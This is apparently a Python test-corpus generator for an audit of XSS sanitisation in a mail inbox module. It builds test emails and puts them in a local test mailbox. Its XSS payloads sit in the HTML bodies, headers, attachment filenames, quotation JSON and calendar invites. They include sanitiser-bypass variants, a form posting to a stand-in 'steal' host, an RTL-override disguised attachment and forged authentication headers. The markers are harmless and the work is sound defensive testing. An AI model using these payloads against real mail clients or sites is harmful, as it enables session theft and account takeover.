#!/usr/bin/env python3
"""Corpus of the audit « XSS from an outside mail » (analysis analyse-assainissement-xss.md, lot S4).

Each attack sets a mark of its own when it runs: (window.__xss=window.__xss||[]).push(/ID/.source) and a console line
« XSS-ID »,
never alert() (a dialog blocks the browser driven by the tests). Search the page, the editor and the pages of the core
for window.__xss after each action: empty = nothing ran.

Writes the mails in dev/xss/eml/ (kept for the next versions) and, with --append, puts them in the mailbox
perso@inbox-test.invalid of the local test Dovecot (dev/dovecot/run.sh). Test data only, never a real mailbox.
The sender of the data mails (forms.xss.example) is « authenticated » by the receiving server mx.inbox-test.invalid:
declare it in Settings > Security (INBOX_AUTH_SERVERS) and add a source « quotation » for this sender.
"""
import base64, email.utils, imaplib, os, sys, time

TO = 'perso@inbox-test.invalid'
HERE = os.path.dirname(os.path.abspath(__file__))
AUTH = ('Authentication-Results: mx.inbox-test.invalid; spf=pass smtp.mailfrom=forms.xss.example; '
        'dkim=pass header.d=forms.xss.example; dmarc=pass header.from=forms.xss.example\r\n')


def js(mark):
    """Code of a mark"""
    # No quote in the code: it fits in any attribute or header, quoted or not
    return f"(window.__xss=window.__xss||[]).push(/{mark}/.source);console.log(/XSS-{mark}/.source)"


def img(mark):
    return f'<img src=x onerror="{js(mark)}">'


def b64(data):
    s = base64.b64encode(data).decode()
    return '\r\n'.join(s[i:i + 76] for i in range(0, len(s), 76))


def rfc2047(text):
    return '=?UTF-8?B?' + base64.b64encode(text.encode()).decode() + '?='


def head(mid, frm, subject, ctype, extra=''):
    return (f'Message-ID: <xss-{mid}@inbox-test.invalid>\r\nFrom: {frm}\r\nTo: {TO}\r\nSubject: {subject}\r\n'
            f'Date: {email.utils.formatdate(localtime=True)}\r\nMIME-Version: 1.0\r\n{extra}Content-Type: {ctype}\r\n\r\n')


B = 'xss-b'
HTML_ATTACKS = ''.join([
    f'<p>B01 script<script>{js("B01")}</script></p>',
    f'<p>B02 img onerror {img("B02")}</p>',
    f'<p>B03 svg onload <svg onload="{js("B03")}"><circle r=1></circle></svg></p>',
    f'<p>B04 <a href="javascript:{js("B04")}">lien javascript</a></p>',
    f'<p>B05 <a href="&#106;avascript:{js("B05")}">lien en entités</a></p>',
    f'<p>B06 <a href="data:text/html;base64,{base64.b64encode(("<script>" + js("B06") + "</script>").encode()).decode()}">lien data</a></p>',
    f'<p>B07 <details open ontoggle="{js("B07")}">details</details></p>',
    f'<noscript><p title="</noscript>{img("B08")}">B08 mxss noscript</p></noscript>',
    f'<template>{img("B09")}</template>',
    f'<p title=\'">{img("B10")}\'>B10 sortie d attribut</p>',
    f'<math><mtext><table><mglyph><style><img src=x onerror="{js("B11")}"></style></mglyph></table></mtext></math>',
    f'<form action="https://xss.example/steal"><input name=q autofocus onfocus="{js("B12")}"><button>B12 form</button></form>',
    f'<iframe srcdoc="<script>parent.{js("B13")}</script>"></iframe>',
    f'<p style="background:url(javascript:{js("B14")})">B14 style</p>',
    f'<div class="butAction" data-cmd="delete" onclick="{js("B15")}">B15 classe de Dolibarr</div>',
    f'<!--><img src=x onerror="{js("B16")}">-->',
    '<p><b>Texte en gras</b>, <span style="color:#c00">rouge</span>, '
    '<a href="https://www.example.org/">lien normal</a></p>',
])

PNG = base64.b64decode('iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAAAF0lEQVR4nGNgYGBgaGhgYGBgYGD4TwABmQMBgVpSegAAAABJRU5ErkJggg==')

QUOTATION = ('{"company":"&lt;img src=x onerror=\\"' + js('Q01').replace('"', '\\"') + '\\"&gt;ACME",'
             '"firstname":"<b>Jean</b>' + img('Q02').replace('"', '\\"') + '",'
             '"lastname":"Dupont\\"/autofocus/onfocus=\\"' + js('Q03').replace('"', '\\"') + '",'
             '"email":"jean.dupont@client.xss.example",'
             '"phone":"01 23 45 67 89<svg onload=\\"' + js('Q04').replace('"', '\\"') + '\\">",'
             '"address":"12 rue <script>' + js('Q05') + '</script>",'
             '"zip":"75001","town":"Paris\\u202Esiraп",'
             '"message":"Bonjour <img src=x onerror=\\"' + js('Q06').replace('"', '\\"') + '\\">"}')

ICS = ('BEGIN:VCALENDAR\r\nVERSION:2.0\r\nPRODID:-//xss//audit//FR\r\nMETHOD:REQUEST\r\nBEGIN:VEVENT\r\n'
       'UID:xss-ics-1@xss.example\r\nDTSTAMP:20261114T090000Z\r\nDTSTART:20261120T090000Z\r\nDTEND:20261120T100000Z\r\n'
       'SUMMARY:I01 Réunion "' + img('I01').replace('"', "'") + '\r\n'
       'LOCATION:I02 <svg onload=' + js('I02').replace(' ', '') + '>\r\n'
       'DESCRIPTION:I03 Ordre du jour <script>' + js('I03') + '</script>\\n&lt\\;img src=x onerror=' + js('I04').replace(' ', '') + '&gt\\;\r\n'
       'ORGANIZER;CN="Org <img src=x onerror=' + js('I05').replace(' ', '') + '>":mailto:org@xss.example\r\n'
       'ATTENDEE;CN=Perso;RSVP=TRUE:mailto:perso@inbox-test.invalid\r\nEND:VEVENT\r\nEND:VCALENDAR\r\n')

MAILS = {
    'body-html': head('body-html', 'Attaque HTML <html@xss.example>', 'XSS 1 corps HTML (B01-B16)', 'text/html; charset=utf-8')
        + '<html><head><style>p{font-family:Arial}</style></head><body>' + HTML_ATTACKS + '</body></html>\r\n',

    'names': head('names', f'"\\"><img src=x onerror=\\"{js("N01")}\\">" <names@xss.example>',
                  rfc2047('XSS 2 sujet <img src=x onerror="' + js('N02') + '"> "guillemet'), 'text/html; charset=utf-8',
                  f'Reply-To: "<svg onload={js("N03").replace(" ", "")}>" <reply@xss.example>\r\n'
                  f'Cc: "Copie <b onmouseover=\'{js("N04")}\'>x</b>" <cc@xss.example>\r\n'
                  f'List-Unsubscribe: <javascript:{js("N05")}>, <https://xss.example/unsub?u=1"><img src=x onerror={js("N06").replace(" ", "")}>>\r\n')
        + '<p>Nom affiché, sujet, réponse à, copie et désinscription piégés (N01-N06).</p>\r\n',

    'text-signature': head('text-signature', 'Paul Signature <paul@client2.xss.example>', 'XSS 3 texte et signature (T01-T05)', 'text/plain; charset=utf-8')
        + 'Bonjour,\r\n\r\nMerci de chiffrer <b>12 raccords</b> ' + img('T01') + '\r\n\r\n--\r\nPaul <script>' + js('T02') + '</script> Signature\r\n'
          'Société : &lt;img src=x onerror="' + js('T03') + '"&gt;Client Deux\r\n'
          'Tél : 01 98 76 54 32 <svg onload="' + js('T04') + '">\r\n'
          'Adresse : 4 avenue " onfocus="' + js('T05') + '" autofocus x="\r\n75002 Paris\r\n',

    'quotation': head('quotation', 'Formulaire <noreply@forms.xss.example>', 'XSS 4 demande de devis X-Quotation-Data (Q01-Q06)', 'text/plain; charset=utf-8',
                      AUTH + 'X-Quotation-Mail: jean.dupont@client.xss.example\r\nX-Quotation-Data: ' + QUOTATION + '\r\n'
                      + 'X-Data-Form-Company: <img src=x onerror="' + js('Q07') + '">Form Co\r\n')
        + 'Nouvelle demande de devis depuis le site.\r\n',

    'attachment': head('attachment', 'Pièce jointe <files@xss.example>', 'XSS 5 noms de pièces jointes (A01-A03)', f'multipart/mixed; boundary="{B}"')
        + f'--{B}\r\nContent-Type: text/plain; charset=utf-8\r\n\r\nVoir les pièces jointes.\r\n'
        + f'--{B}\r\nContent-Type: image/png; name="a01.png"\r\nContent-Transfer-Encoding: base64\r\n'
          f'Content-Disposition: attachment; filename="A01 <img src=x onerror={js("A01").replace(" ", "")}>.png"\r\n\r\n{b64(PNG)}\r\n'
        + f'--{B}\r\nContent-Type: application/pdf; name="a02"\r\nContent-Transfer-Encoding: base64\r\n'
          f'Content-Disposition: attachment; filename="A02 facture‮fdp.exe"\r\n\r\n{b64(b"%PDF-1.4 x")}\r\n'
        + f'--{B}\r\nContent-Type: text/html; name="a03.html"\r\nContent-Transfer-Encoding: base64\r\n'
          f'Content-Disposition: attachment; filename="a03.html"\r\n\r\n{b64(("<script>" + js("A03") + "</script>").encode())}\r\n--{B}--\r\n',

    'invite': head('invite', 'Organisateur <org@xss.example>', 'XSS 6 invitation (I01-I05)', f'multipart/mixed; boundary="{B}"')
        + f'--{B}\r\nContent-Type: text/plain; charset=utf-8\r\n\r\nInvitation à une réunion.\r\n'
        + f'--{B}\r\nContent-Type: text/calendar; method=REQUEST; charset=utf-8\r\nContent-Transfer-Encoding: base64\r\n\r\n{b64(ICS.encode())}\r\n--{B}--\r\n',
}


def main():
    out = os.path.join(HERE, 'eml')
    os.makedirs(out, exist_ok=True)
    for name, raw in MAILS.items():
        with open(os.path.join(out, name + '.eml'), 'w', encoding='utf-8', newline='') as f:
            f.write(raw)
    print('corpus: %d mails in %s' % (len(MAILS), out))
    if '--append' in sys.argv:
        m = imaplib.IMAP4('127.0.0.1', 10143)
        m.login(TO, 'perso-test-pass')
        for raw in MAILS.values():
            m.append('INBOX', '', imaplib.Time2Internaldate(time.time()), raw.encode('utf-8'))
        m.logout()
        print('appended to ' + TO)


if __name__ == '__main__':
    main()
